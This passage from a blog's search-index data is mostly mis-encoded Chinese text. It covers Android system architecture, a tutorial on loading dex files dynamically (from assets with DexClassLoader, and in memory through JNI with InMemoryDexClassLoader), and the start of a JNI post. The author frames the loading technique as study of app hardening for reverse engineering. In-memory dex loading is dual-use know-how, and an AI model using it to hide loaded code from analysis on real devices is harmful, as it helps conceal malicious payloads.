å¹³å°çš„è¿›ç¨‹é—´é€šä¿¡åŠŸèƒ½ã€‚æºä»£ç ä½äº drivers/staging/android/binder.c ã€‚ ç”µæºç®¡ç† (PM) ï¼šä¸€ä¸ªåŸºäºæ ‡å‡† Linux ç”µæºç®¡ç†ç³»ç»Ÿçš„è½»é‡çº§ Android ç”µæºç®¡ç†é©±åŠ¨ï¼Œé’ˆå¯¹åµŒå…¥å¼è®¾å¤‡åšäº†å¾ˆå¤šä¼˜åŒ–ï¼Œæ¯”å¦‚ç”µæ± ç”µé‡ã€‚æºä»£ç ä½äºï¼š kernel/power/earlysuspend.cã€kernel/power/consoleearlysuspend.cã€kernel/power/fbearlysuspend.cã€kernel/power/wakelock.cã€kernel/power/userwakelock.c ä½å†…å­˜ç®¡ç†å™¨ï¼šæ¯” Linux çš„æ ‡å‡†çš„ OOM æœºåˆ¶æ›´åŠ çµæ´»ï¼Œå®ƒå¯ä»¥æ ¹æ®éœ€è¦æ€æ­»è¿›ç¨‹ä»¥é‡Šæ”¾éœ€è¦çš„å†…å­˜ã€‚æºä»£ç ä½äº drivers/staging/ android/lowmemorykiller.c ã€‚ åŒ¿åå…±äº«å†…å­˜ï¼š ä¸ºè¿›ç¨‹é—´æä¾›å¤§å—å…±äº«å†…å­˜ï¼ŒåŒæ—¶ä¸ºå†…æ ¸æä¾›å›æ”¶å’Œç®¡ç†è¿™ä¸ªå†…å­˜çš„æœºåˆ¶ã€‚æºä»£ç ä½äº mm/ashmem.c ã€‚ PMEM ï¼šç”¨äºå‘ç”¨æˆ·ç©ºé—´æä¾›è¿ç»­çš„ç‰©ç†å†…å­˜åŒºåŸŸï¼Œ DSP å’ŒæŸäº›è®¾å¤‡åªèƒ½å·¥ä½œåœ¨è¿ç»­çš„ç‰©ç†å†…å­˜ä¸Šã€‚æºä»£ç ä½äº drivers/misc/pmem.c ã€‚ Logger ï¼šä¸€ä¸ªè½»é‡çº§çš„æ—¥å¿—è®¾å¤‡ï¼Œç”¨äºæŠ“å– Android ç³»ç»Ÿçš„å„ç§æ—¥å¿—ã€‚æºä»£ç ä½äº drivers/staging/android/logger.c ã€‚ Alarm ï¼šæä¾›äº†ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç”¨äºæŠŠè®¾å¤‡ä»ç¡çœ çŠ¶æ€å”¤é†’ï¼ŒåŒæ—¶å®ƒè¿˜æä¾›äº†ä¸€ä¸ªå³ä½¿åœ¨è®¾å¤‡ç¡çœ æ—¶ä¹Ÿä¼š è¿è¡Œçš„æ—¶é’ŸåŸºå‡†ã€‚æºä»£ç ä½äº drivers/rtc/alarm.c ã€‚ USB Gadget ï¼šé©±åŠ¨ ä¸€ä¸ªåŸºäºæ ‡å‡† Linux USB gadget é©±åŠ¨æ¡†æ¶çš„è®¾å¤‡é©±åŠ¨ï¼ŒAndroid çš„ USB é©±åŠ¨æ˜¯åŸºäº gaeget æ¡†æ¶çš„ã€‚æºä»£ç ä½äº drivers/usb/gadget/ ã€‚ Ram Console ï¼š ä¸ºäº†æä¾›è°ƒè¯•åŠŸèƒ½ï¼ŒAndroid å…è®¸å°†è°ƒè¯•æ—¥å¿—ä¿¡æ¯å†™å…¥ä¸€ä¸ªè¢«ç§°ä¸º RAM Console çš„è®¾å¤‡é‡Œï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäº RAM çš„ Buffer ã€‚æºä»£ç ä½äº drivers/staging/android/ram_console.c ã€‚ timed device ï¼š æä¾›äº†å¯¹è®¾å¤‡è¿›è¡Œå®šæ—¶æ§åˆ¶çš„åŠŸèƒ½ï¼Œç›®å‰æ”¯æŒ vibrator å’Œ LED è®¾å¤‡ã€‚æºä»£ç ä½äº drivers/staging/android/timed_output.c(timed_gpio.c )ã€‚ Yaffs2 ï¼šAndroid é‡‡ç”¨ Yaffs2 ä½œä¸º MTD nand flash æ–‡ä»¶ç³»ç»Ÿï¼Œæºä»£ç ä½äº fs/yaffs2/ ç›®å½•ä¸‹ã€‚Yaffs2 æ˜¯ä¸€ä¸ªå¿«é€Ÿç¨³å®šçš„åº”ç”¨äº NAND å’Œ NOR Flash çš„è·¨å¹³å°çš„åµŒå…¥å¼è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿï¼ŒåŒå…¶ä»– Flash æ–‡ä»¶ç³»ç»Ÿç›¸æ¯”ï¼ŒYaffs2 èƒ½ä½¿ç”¨æ›´å°çš„å†…å­˜æ¥ä¿å­˜å…¶è¿è¡ŒçŠ¶æ€ï¼Œå› æ­¤å®ƒå ç”¨å†…å­˜å°ã€‚Yaffs2 çš„åƒåœ¾å›æ”¶éå¸¸ç®€å•è€Œä¸”å¿«é€Ÿï¼Œå› æ­¤èƒ½è¡¨ç°å‡ºæ›´å¥½çš„æ€§èƒ½ã€‚Yaffs2 åœ¨å¤§å®¹é‡çš„ NAND Flash ä¸Šçš„æ€§èƒ½è¡¨ç°å°¤ä¸ºçªå‡ºï¼Œéå¸¸é€‚åˆå¤§å®¹é‡çš„ Flash å­˜å‚¨ã€‚ # ç”¨æˆ·ç©ºé—´å±‚ # ç¡¬ä»¶æŠ½è±¡å±‚ (HAL) ç¡¬ä»¶æŠ½è±¡å±‚æœ¬åº”è¯¥å±äº Linux å†…æ ¸çš„é©±åŠ¨çš„ï¼Œä½†æ˜¯ç”±äºéƒ¨åˆ†ç¡¬ä»¶å‚å•†ä¸æƒ³æŠŠè‡ªå·±çš„æ ¸å¿ƒä»£ç å…¬å¼€ï¼Œå¦‚æœæŠŠä»£ç æ”¾åœ¨å†…æ ¸ç©ºé—´é‡Œå°±éœ€è¦éµå¾ª GUN License ï¼Œä¼šæŸå®³å‚å®¶çš„åˆ©ç›Šã€‚æ‰€ä»¥ï¼ŒGoogle ä¸ºäº†å“åº”å‚å®¶ï¼Œåœ¨ Android çš„æ¶æ„é‡Œæå‡º HAL çš„æ¦‚å¿µï¼ŒæŠŠå¯¹ç¡¬ä»¶çš„æ”¯æŒåˆ†ä¸ºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ï¼Œè€Œ HAL å±‚å°±å±äºè¿™é‡Œé¢çš„ç”¨æˆ·ç©ºé—´ï¼Œè¯¥éƒ¨åˆ†ä»£ç éµå¾ª Apache License ï¼Œæ‰€ä»¥å‚å®¶å¯ä»¥æŠŠæ ¸å¿ƒçš„ä»£ç å®ç°åœ¨ HAL å±‚ï¼Œæ— éœ€å¯¹å¤–å¼€æ”¾æºä»£ç ã€‚ HAL ä½¿ç”¨æŠ½è±¡å’Œå°è£…çš„æ¦‚å¿µï¼Œè§£å†³äº†è§£å†³è½¯ä»¶å’Œç¡¬ä»¶çš„ â€œå†²çªâ€ çš„é—®é¢˜ï¼Œæ˜¯ Linux å†…æ ¸ä¸ç”¨æˆ·ç©ºé—´äº¤äº’çš„çº½å¸¦ï¼Œä»–æœ‰å¦‚ä¸‹ä¼˜ç‚¹ ä½¿ç”¨ HAL å¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜å‡å°‘å¼€å‘æ—¶é—´å¹¶æé«˜ä»£ç æ¶æ„è´¨é‡ï¼› HAL çš„å®ç°å¯ä»¥ä½œä¸ºåŠ¨æ€åº“æˆ–æ¨¡å—åŠ è½½ï¼Œå®ç°äº†å¯¹ç¡¬ä»¶çš„æŠ½è±¡ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥éšè—ä»£ç ï¼ˆä¾¿æ·æ€§ + å®‰å…¨æ€§ï¼‰ã€‚ # ç³»ç»Ÿåº“å’Œè¿è¡Œæ—¶åº“ (Native C/C++ Library&amp;&amp;Android Runtime) é€šè¿‡ä¸€äº› c/c++ åº“æ¥ä¸º Android æä¾›ä¸»è¦çš„ç‰¹æ€§æ”¯æŒ ç³»ç»Ÿåº“æ˜¯åº”ç”¨ç¨‹åºæ¡†æ¶çš„æ”¯æ’‘ï¼Œå…±æœ‰ä¹ä¸ª Libc ï¼šç³»ç»Ÿ c åº“ï¼Œæ˜¯ä» BSD ç»§æ‰¿æ¥çš„æ ‡å‡† C ç³»ç»Ÿå‡½æ•°åº“ï¼Œä¸“é—¨ä¸ºåŸºäº EmbeddedLinux çš„è®¾å¤‡å®šåˆ¶ã€‚ Media Framework ï¼ˆå¤šåª’ä½“åº“ï¼‰ï¼šAndroid ç³»ç»Ÿå¤šåª’ä½“åº“ï¼ŒåŸºäº PacketVideoOpen ã€ CORE ã€‚è¯¥åº“æ”¯æŒå½•æ”¾ã€‚å¹¶ä¸”å¯ä»¥å½•åˆ¶è®¸å¤šæµè¡Œçš„éŸ³é¢‘è§†é¢‘æ ¼å¼ã€‚è¿˜æœ‰é™æ€æ˜ åƒæ–‡ä»¶ï¼ŒåŒ…æ‹¬ MPEG4ã€H.264ã€MP3ã€AACã€JPGã€PNG ç­‰ã€‚ Surface Manager ï¼šä¸»è¦è´Ÿè´£ç®¡ç†é’ˆå¯¹æ˜¾ç¤ºç³»ç»Ÿçš„è®¿é—®ï¼Œå¹¶ä¸”ä¸ºå¤šä¸ªåº”ç”¨ç¨‹åºæä¾› 2D å’Œ 3D å›¾å±‚çš„æ— ç¼èåˆã€‚ Webkit ï¼šæµè§ˆå™¨ã€‚ä¸€ä¸ªæœ€æ–°çš„ web æµè§ˆå™¨å¼•æ“ï¼Œç”¨æ¥æ”¯æŒ Android æµè§ˆå™¨å’Œä¸€ä¸ªå¯åµŒå…¥çš„ Web è§†å›¾ã€‚ SGL ï¼šä¸€ä¸ªå†…ç½®çš„ 2D å›¾å½¢å¼•æ“ã€‚ SSL ï¼šä½äº TCP/IP ä¸å„ç§åº”ç”¨å±‚åè®®ä¹‹é—´ä¸ºæ•°æ®é€šä¿¡æä¾›æ”¯æŒã€‚ OpenGL ES ï¼š3D æ•ˆæœçš„æ”¯æŒã€‚åŸºäº OpenGLES 1.0 APIs å®ç°ï¼›è¯¥åº“å¯ä»¥ä½¿ç”¨ç¡¬ä»¶ 3D åŠ é€Ÿæˆ–è€…ä½¿ç”¨é«˜åº¦ä¼˜åŒ–çš„ 3D è½¯åŠ é€Ÿã€‚ greeType ï¼šæä¾›ä½å›¾ bitmap å’Œå‘é‡ vector çš„å­—ä½“æè¿°ä¸æ˜¾ç¤ºã€‚ SQLite ï¼šä¸€ä¸ªå¯¹äºæ‰€æœ‰åº”ç”¨ç¨‹åºå¯ç”¨ã€åŠŸèƒ½å¼ºåŠ²çš„è½»å‹å…³ç³»å‹æ•°æ®åº“å¼•æ“ é™¤äº†ä¸Šé¢çš„ä¸»è¦ç³»ç»Ÿç±»åº“ä¹‹å¤–ï¼Œè¿˜æœ‰ Android NDK ï¼Œå³ Android åŸç”Ÿåº“ã€‚ Android è¿è¡Œæ—¶åº“åŒ…å«æ ¸å¿ƒåº“å’Œ Dalvik è™šæ‹Ÿæœº æ ¸å¿ƒåº“ï¼šæä¾›äº† Java è¯­è¨€ API ä¸­çš„å¤§å¤šæ•°åŠŸèƒ½ï¼ŒåŒæ—¶ä¹ŸåŒ…å« Android çš„ä¸€äº›æ ¸å¿ƒ API. å¦‚ android.OS ã€ android.net ã€ android.media ç­‰ã€‚ Dalvik è™šæ‹Ÿæœºï¼šAndroid ç¨‹åºä¸åŒäº J2ME ç¨‹åºï¼ˆæ˜¯ java çš„ä¸€ç§è¿è¡Œç¯å¢ƒï¼‰ï¼Œæ¯ä¸ª Android åº”ç”¨éƒ½è¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹ä¸Šï¼Œäº«æœ‰ Dalvik è™šæ‹Ÿæœºä¸ºå®ƒåˆ†é…çš„ä¸“æœ‰å®ä¾‹ï¼Œå¹¶åœ¨è¯¥å®ä¾‹ä¸­æ‰§è¡Œã€‚Dalvik è™šæ‹Ÿæœºå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼æ˜¯ï¼ˆ .dex ï¼‰ã€‚ å¤§å¤šæ•°è™šæ‹ŸæœºåŒ…æ‹¬ JVM éƒ½æ˜¯åŸºäºæ ˆçš„ï¼Œè€Œ Dalvik è™šæ‹Ÿæœºåˆ™æ˜¯åŸºäºå¯„å­˜å™¨çš„ï¼Œæ‰€æœ‰çš„ç±»éƒ½ç»ç”± JAVA ç¼–è¯‘å™¨ç¼–è¯‘ï¼Œç„¶åé€šè¿‡ SDK ä¸­ çš„ â€œdxâ€ å·¥å…·è½¬åŒ–æˆ.dex æ ¼å¼ç”±è™šæ‹Ÿæœºæ‰§è¡Œã€‚åœ¨ä¸€äº›åº•å±‚åŠŸèƒ½ä¾‹å¦‚çº¿ç¨‹å’Œä½å†…å­˜ç®¡ç†ç­‰æ–¹é¢ï¼ŒDalvik è™šæ‹Ÿæœºæ˜¯ä¾èµ– Linux å†…æ ¸çš„ã€‚ # åº”ç”¨æ¡†æ¶å±‚ (Java API Framework) åº”ç”¨æ¡†æ¶å±‚ä¸ºå¼€å‘äººå‘˜æä¾›äº†å¼€å‘åº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„ APIï¼Œæˆ‘ä»¬å¹³å¸¸å¼€å‘åº”ç”¨ç¨‹åºéƒ½æ˜¯è°ƒç”¨è¿™ä¸€å±‚æ‰€æä¾›çš„ APIï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ç³»ç»Ÿåº”ç”¨ã€‚è¿™ä¸€å±‚æ˜¯ç”± Java ä»£ç ç¼–å†™çš„ï¼Œå¯ä»¥ç§°ä¸º Java Frameworkã€‚è¿™ä¸€å±‚æ‰€æä¾›çš„ä¸»è¦ç»„ä»¶å¦‚ä¸‹ åç§° åŠŸèƒ½æè¿° Activity Managerï¼ˆæ´»åŠ¨ç®¡ç†å™¨ï¼‰ ç®¡ç†å„ä¸ªåº”ç”¨ç¨‹åºç”Ÿå‘½å‘¨æœŸï¼Œä»¥åŠå¸¸ç”¨çš„å¯¼èˆªå›é€€åŠŸèƒ½ Location Managerï¼ˆä½ç½®ç®¡ç†å™¨ï¼‰ æä¾›åœ°ç†ä½ç½®åŠå®šä½åŠŸèƒ½æœåŠ¡ Package Managerï¼ˆåŒ…ç®¡ç†å™¨ï¼‰ ç®¡ç†æ‰€æœ‰å®‰è£…åœ¨ Android ç³»ç»Ÿä¸­çš„åº”ç”¨ç¨‹åº Notification Managerï¼ˆé€šçŸ¥ç®¡ç†å™¨ï¼‰ ä½¿å¾—åº”ç”¨ç¨‹åºå¯ä»¥åœ¨çŠ¶æ€æ ä¸­æ˜¾ç¤ºè‡ªå®šä¹‰çš„æç¤ºä¿¡æ¯ Resource Managerï¼ˆèµ„æºç®¡ç†å™¨ï¼‰ æä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„å„ç§éä»£ç èµ„æºï¼Œå¦‚æœ¬åœ°åŒ–å­—ç¬¦ä¸²ã€å›¾ç‰‡ã€å¸ƒå±€æ–‡ä»¶ã€é¢œè‰²æ–‡ä»¶ç­‰ Telephony Managerï¼ˆç”µè¯ç®¡ç†å™¨ï¼‰ ç®¡ç†æ‰€æœ‰çš„ç§»åŠ¨è®¾å¤‡åŠŸèƒ½ Window Managerï¼ˆçª—å£ç®¡ç†å™¨ï¼‰ ç®¡ç†æ‰€æœ‰å¼€å¯çš„çª—å£ç¨‹åº Content Providerï¼ˆå†…å®¹æä¾›è€…ï¼‰ ä½¿å¾—ä¸åŒåº”ç”¨ç¨‹åºä¹‹é—´å¯ä»¥å…±äº«æ•°æ® View Systemï¼ˆè§†å›¾ç³»ç»Ÿï¼‰ æ„å»ºåº”ç”¨ç¨‹åºçš„åŸºæœ¬ç»„ä»¶ # åº”ç”¨å±‚ (System Apps) ç³»ç»Ÿå†…ç½®çš„åº”ç”¨ç¨‹åºä»¥åŠéç³»ç»Ÿçº§çš„åº”ç”¨ç¨‹åºéƒ½å±äºåº”ç”¨å±‚ï¼Œè´Ÿè´£ä¸ç”¨æˆ·è¿›è¡Œç›´æ¥äº¤äº’ï¼Œé€šå¸¸ä½¿ç”¨ Java æˆ– Kotlin è¿›è¡Œå¼€å‘ # å‚è€ƒèµ„æ–™ Android ç³»ç»Ÿæ¶æ„ â€”â€” å¯¼è¯» äº†è§£å®‰å“æ¶æ„ (linux å†…æ ¸å±‚ã€ç³»ç»Ÿè¿è¡Œåº“å±‚ã€åº”ç”¨æ¡†æ¶å±‚ã€åº”ç”¨å±‚) æµ…è°ˆ HALï¼ˆ1ï¼‰- ä»‹ç» Android ç³»ç»Ÿäº”å±‚æ¶æ„","categories":[],"tags":[]},{"title":"AndroidåŠ¨æ€åŠ è½½dex","slug":"dexloader","date":"2023-09-25T06:01:45.000Z","updated":"2024-02-02T11:57:04.457Z","comments":true,"path":"dexloader/","link":"","permalink":"https://oacia.dev/dexloader/","excerpt":"","text":"åœ¨å®‰å“ä¸­å¯ä»¥åŠ¨æ€åŠ è½½ dex æ¥è¿›è¡Œç±»çš„è°ƒç”¨ï¼Œè€Œå¯¹äºå¸‚é¢ä¸Šå¸¸è§çš„ dex åŠ å›ºæ¥è¯´ï¼Œä¹ŸåŒæ ·é‡‡å–äº†åŠ å¯† dex, å¹¶ä¸”åœ¨è§£å¯†ä¹‹ååŠ¨æ€è°ƒç”¨çš„æ–¹å¼æ¥è¿›è¡Œ dex çš„ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—æˆ‘æœ‰å¿…è¦å»å­¦ä¹ ä¸€ä¸‹ dex çš„åŠ¨æ€åŠ è½½è¿‡ç¨‹ï¼Œä»è€Œå¯¹ apk çš„åŠ å›ºæœ‰æ›´åŠ æ·±åˆ»çš„äº†è§£å’Œä½“ä¼š. # Android studio ç”Ÿæˆ dex æ—¢ç„¶æˆ‘ä»¬æƒ³è¦è®©æˆ‘ä»¬çš„ç¨‹åºåŠ¨æ€åŠ è½½ dex, é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šéœ€è¦å…ˆç”Ÿæˆä¸€ä¸ª dex æ‰å¯ä»¥å’¯ é¦–å…ˆæˆ‘ä»¬ç‚¹å‡» File-&gt;New-&gt;New Module æ–°å»ºä¸€ä¸ª Module é€‰ä¸­æ­¤å¤„çš„ Android Library , æ¥åˆ›å»ºä¸€ä¸ª Library ç„¶åæŠŠ dex çš„æ ¸å¿ƒä»£ç å†™ä¸€ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸² éšåæˆ‘ä»¬é€‰ä¸­ dexlib1 è¿™ä¸ª Library , å¹¶ç‚¹å‡» Build-&gt;Make Module 'apkprotect.dexlib1' ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ Dexlib1/.transforms ç›®å½•ä¸­æ‰¾åˆ°ç”Ÿæˆçš„ dex æ–‡ä»¶ # Dex ä»æ–‡ä»¶ä¸­åŠ¨æ€åŠ è½½ ä¸ºäº†è®© apk å¯ä»¥é¡ºåˆ©æ‰¾åˆ°æˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„ Dex, æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ª dex_class.dex ç§»å…¥åˆ° assets ç›®å½•ä¸­ éšåä¾¿å¯ä»¥åŠ è½½è¯¥ dex å¹¶é€šè¿‡åå°„æœºåˆ¶è¿›è¡Œå‡½æ•°è°ƒç”¨ åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡Œçš„çŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨ä»»ä½•æ–¹æ³•å’Œå±æ€§ï¼›åƒè¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸º Java çš„åå°„æœºåˆ¶ã€‚ éœ€è¦ç”¨åˆ° DexClassLoader å‡½æ•°è¯´æ˜å¦‚ä¸‹ /*DexClassLoader ç±»å‚æ•°å«ä¹‰@param dexPath: å¾…åŠ è½½çš„ dex æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœæ˜¯å¤–å­˜è·¯å¾„ï¼Œä¸€å®šè¦åŠ ä¸Šè¯»å¤–å­˜æ–‡ä»¶çš„æƒé™@param optimizedDirectory: è§£å‹åçš„.dex æ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼Œä¸å¯ä¸ºç©ºï¼Œæ­¤ä½ç½®ä¸€å®šè¦æ˜¯å¯è¯»å†™ä¸”ä»…è¯¥åº”ç”¨å¯è¯»å†™@param librarySearchPath: æŒ‡å‘åŒ…å«æœ¬åœ°åº“ (so) çš„æ–‡ä»¶å¤¹è·¯å¾„ï¼Œå¯ä»¥è®¾ä¸º null@param parent: çˆ¶çº§ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡ Context.getClassLoader è·å–åˆ°ï¼Œä¹Ÿå¯é€šè¿‡ ClassLoader.getSystemClassLoader () è·å–åˆ°*/public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent)å…·ä½“ä»£ç å¦‚ä¸‹ // å°† dex æ–‡ä»¶ä» assets ç›®å½•å¤åˆ¶åˆ°åº”ç”¨ç¼“å­˜ç›®å½•AssetManager assetManager = getAssets();InputStream inputStream = assetManager.open(\"dex_class.dex\");File dexfile = new File(getCacheDir(), \"dex_class.dex\");OutputStream outputStream = new FileOutputStream(dexfile);byte[] buffer = new byte[1024];int length;while ((length = inputStream.read(buffer)) > 0) &#123; outputStream.write(buffer, 0, length);&#125;inputStream.close();outputStream.close();// ä½¿ç”¨ DexClassLoader åŠ è½½ dexDexClassLoader classLoader = new DexClassLoader(dexfile.getAbsolutePath(),getCacheDir().getAbsolutePath(),null,getClassLoader());// åŠ è½½æ’ä»¶çš„ç±» (æ’ä»¶çš„åŒ…åã€‚ç±»å)Class&lt;?> clazz = classLoader.loadClass(\"com.oacia.dexlib1.dex_class\");// è·å–ç±»çš„å®ä¾‹Object dexlib_obj = clazz.newInstance();// é€šè¿‡åå°„è·å–å¯¹åº”çš„æ–¹æ³•Method method = clazz.getDeclaredMethod(\"say_hello\", Context.class);// å…³é—­å®‰å…¨æ£€æŸ¥è¾¾åˆ°æå‡åå°„é€Ÿåº¦çš„ç›®çš„method.setAccessible(true);// è°ƒç”¨åå°„æ–¹æ³•method.invoke(dexlib_obj,MainActivity.this);good! æˆåŠŸè°ƒç”¨æ–¹æ³•ï¼ # Dex ä»å†…å­˜ä¸­åŠ¨æ€åŠ è½½ äº‹å®ä¸Šï¼Œdex æ˜¯å¯ä»¥åœ¨å†…å­˜ä¸­è¢«åŠ¨æ€åŠ è½½çš„ï¼Œè€Œä¸ä¸€å®šéè¦ä½¿ç”¨ dex æ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™ä¸€ç§åŠ è½½æ–¹å¼è¢«ç§°ä¸º Dex ä¸è½åœ°åŠ è½½ é€šè¿‡ InMemoryDexClassLoader å¯ä»¥å®ç° dex åœ¨å†…å­˜çš„åŠ è½½ // åŠ è½½ dex jobject classLoader = CallObjectMethod(g_context, \"getClassLoader\", \"()Ljava/lang/ClassLoader;\").l; if (g_sdk_int &lt; 26) &#123; ndk_dlclose(art_handle); &#125; else &#123; jclass ElementClass = env->FindClass(\"java/nio/ByteBuffer\"); jobjectArray dexBufferArr = env->NewObjectArray(dexBuffers.size(), ElementClass, NULL); for (int i = 0; i &lt; dexBuffers.size(); i++) &#123; env->SetObjectArrayElement(dexBufferArr, i, dexBuffers[i]); &#125; jclass InMemoryDexClassLoaderClass = env->FindClass(\"dalvik/system/InMemoryDexClassLoader\"); jmethodID InMemoryDexClassLoaderInit = env->GetMethodID(InMemoryDexClassLoaderClass, \"&lt;init>\", \"([Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V\"); jobject InMemoryObj = env->NewObject(InMemoryDexClassLoaderClass, InMemoryDexClassLoaderInit, dexBufferArr, classLoader); jobject pathListObj = GetField(InMemoryObj, \"pathList\", \"Ldalvik/system/DexPathList;\").l; jobjectArray dexElements; if (g_sdk_int >= 29) &#123; jclass list_jcs = env->FindClass(\"java/util/ArrayList\"); jmethodID list_init = env->GetMethodID(list_jcs, \"&lt;init>\", \"()V\"); jobject list_obj = env->NewObject(list_jcs, list_init); dexElements = static_cast&lt;jobjectArray>(CallStaticMethod(\"dalvik/system/DexPathList\", \"makeInMemoryDexElements\", \"([Ljava/nio/ByteBuffer;Ljava/util/List;)[Ldalvik/system/DexPathList$Element;\", dexBufferArr, list_obj).l); &#125; else &#123; dexElements = static_cast&lt;jobjectArray>(GetField(pathListObj, \"dexElements\", \"[Ldalvik/system/DexPathList$Element;\").l); &#125; for (int i = 0; i &lt; env->GetArrayLength(dexElements); i++) &#123; dexobjs.push_back(env->GetObjectArrayElement(dexElements, i)); &#125; env->DeleteLocalRef(ElementClass); env->DeleteLocalRef(InMemoryDexClassLoaderClass); env->DeleteLocalRef(InMemoryObj); env->DeleteLocalRef(pathListObj); &#125;éšåå°† dex æ·»åŠ åˆ° DexPathList ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ FindClass è·å–åˆ°è¿™ä¸€ä¸ªç±»äº† static void make_dex_elements(JNIEnv *env, jobject classLoader, std::vector&lt;jobject> dexFileobjs)&#123; jclass PathClassLoader = env->GetObjectClass(classLoader); jclass BaseDexClassLoader = env->GetSuperclass(PathClassLoader); // get pathList fieldid jfieldID pathListid = env->GetFieldID(BaseDexClassLoader, \"pathList\", \"Ldalvik/system/DexPathList;\"); jobject pathList = env->GetObjectField(classLoader, pathListid); // get DexPathList Class jclass DexPathListClass = env->GetObjectClass(pathList); // get dexElements fieldid jfieldID dexElementsid = env->GetFieldID(DexPathListClass, \"dexElements\", \"[Ldalvik/system/DexPathList$Element;\"); jobjectArray dexElement = static_cast&lt;jobjectArray>(env->GetObjectField(pathList, dexElementsid)); jint len = env->GetArrayLength(dexElement); LOGD(\"[+]Elements size:%d, dex File size: %d\", len, dexFileobjs.size()); // Get dexElement all values and add add each value to the new array jclass ElementClass = env->FindClass( \"dalvik/system/DexPathList$Element\"); // dalvik/system/DexPathList$Element jobjectArray new_dexElement = env->NewObjectArray(len + dexFileobjs.size(), ElementClass, NULL); for (int i = 0; i &lt; len; i++) &#123; env->SetObjectArrayElement(new_dexElement, i, env->GetObjectArrayElement(dexElement, i)); &#125; if (g_sdk_int &lt; 26) &#123; jmethodID ElementInit = env->GetMethodID(ElementClass, \"&lt;init>\", \"(Ljava/io/File;ZLjava/io/File;Ldalvik/system/DexFile;)V\"); jboolean isDirectory = JNI_FALSE; for (int i = 0; i &lt; dexFileobjs.size(); i++) &#123; jobject element_obj = env->NewObject(ElementClass, ElementInit, NULL, isDirectory, NULL, dexFileobjs[i]); env->SetObjectArrayElement(new_dexElement, len + i, element_obj); &#125; &#125; else &#123; for (int i = 0; i &lt; dexFileobjs.size(); i++) &#123; env->SetObjectArrayElement(new_dexElement, len + i, dexFileobjs[i]); &#125; &#125; env->SetObjectField(pathList, dexElementsid, new_dexElement); env->DeleteLocalRef(ElementClass); env->DeleteLocalRef(dexElement); env->DeleteLocalRef(DexPathListClass); env->DeleteLocalRef(pathList); env->DeleteLocalRef(BaseDexClassLoader); env->DeleteLocalRef(PathClassLoader);&#125;å½“ dex è¢«åŠ è½½åˆ°å†…å­˜ä¸­ä¹‹åï¼Œä½¿ç”¨ä¸‹åˆ—çš„è¯­å¥å³å¯å®ç°ç›¸å…³å‡½æ•°çš„åå°„è°ƒç”¨ jclass clazz = env->FindClass(\"com/oacia/dexlib1/dex_class\");// åˆ›å»ºç±» com/oacia/dexlib1/dex_class çš„å®ä¾‹jobject obj = env->AllocObject(clazz);// è·å– Java æ–¹æ³• \"say_hello\" çš„ JNI å¼•ç”¨jmethodID methodID = env->GetMethodID(clazz, \"say_hello\", \"(Landroid/content/Context;)V\");// è°ƒç”¨ Java æ–¹æ³•env->CallVoidMethod(obj, methodID,cnt);ç‚¹å‡» LOAD MEMORY DEX , å‡½æ•°è°ƒç”¨æˆåŠŸï½ # å‚è€ƒèµ„æ–™ Android åŠ å£³ä¸è„±å£³ï¼ˆ11ï¼‰â€”â€” ä¸è½åœ°åŠ è½½å£³çš„å¯¹æŠ—ç ”ç©¶ https://github.com/Frezrik/Jiagu","categories":[],"tags":[]},{"title":"å®‰å“JNIå­¦ä¹ ","slug":"android-JNI","date":"2023-09-21T09:25:53.000Z","updated":"2024-07-10T05:33:31.479Z","comments":true,"path":"android-JNI/","link":"","permalink":"https://oacia.dev/android-JNI/","excerpt":"","text":"åœ¨æ—¥å¸¸çš„å®‰å“é€†å‘ä¸­ï¼Œå¯èƒ½ä¼šé‡åˆ°ä»£ç åœ¨ libxxx.so ä¸­çš„æƒ…å†µï¼Œè€Œè¿™ç§åœ¨ so ä¸­çš„ä»£ç çš„ç¼–å†™å°±æ¶‰åŠåˆ°äº†å®‰å“çš„ JNI (Java Native Interface) å¼€å‘ï¼Œä¿—è¯è¯´è¦æƒ³ä¼šé€†å‘ï¼Œé‚£ä¹ˆé¦–å…ˆå¾—è¦å­¦ä¼šæ­£å‘ï¼Œå‡å¦‚éƒ½æ²¡è§è¿‡æŸç§è¯­æ³•ï¼Œé‚£è¿˜æ€ä¹ˆé€†å‘ä¸‹å»å˜ï¼Ÿæ‰€ä»¥å°±ç©ç© JNI å’¯ï½ # åœ¨ Android studio ä¸­å¼€å‘ JNI 